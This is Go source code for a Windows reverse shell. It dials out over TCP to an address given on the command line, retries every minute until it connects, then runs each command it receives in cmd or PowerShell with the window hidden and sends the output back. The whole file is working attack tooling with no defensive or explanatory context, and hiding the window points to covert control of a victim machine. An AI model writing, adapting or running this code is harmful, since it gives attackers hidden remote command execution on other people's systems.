package main

import (
	"bufio"
	"flag"
	"fmt"
	"net"
	"os/exec"
	"syscall"
	"time"
)

//todo implement "cd"
func main() {
	var terminal = ""
	ipaddr := flag.String("a","127.0.0.1","ip")
	port := flag.Int("p",1234,"port")
	term := flag.String("t","p","Cmd/Powershell")
	flag.Parse()
	address := fmt.Sprintf("%s:%d",*ipaddr, *port)
	switch *term {			//choose witch terminal to use
	case "cmd":
		terminal = "cmd"
	case "c":
		terminal = "cmd"
	case "powershell":
		terminal = "powershell"
	case "p":
		terminal = "powershell"
	default:
		terminal = "powershell"
	}
	reverse(address,terminal)
}

func reverse(host string,term string) {
	c, err := net.Dial("tcp", host)
	if err != nil {
		if c != nil {
			c.Close()
		}
		time.Sleep(time.Minute)
		reverse(host,term)
	}
	fmt.Println("Connected... :)")

	r := bufio.NewReader(c)
	for {
		c.Write([]byte("$ "))
		order, err := r.ReadString('\n')
		if nil != err {
			c.Close()
			fmt.Println("Closed... :(")
			return
		}

		cmd := exec.Command(term, "/C", order)

		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}	//Hide window
		out, _ := cmd.CombinedOutput()
		c.Write(out)
	}
}
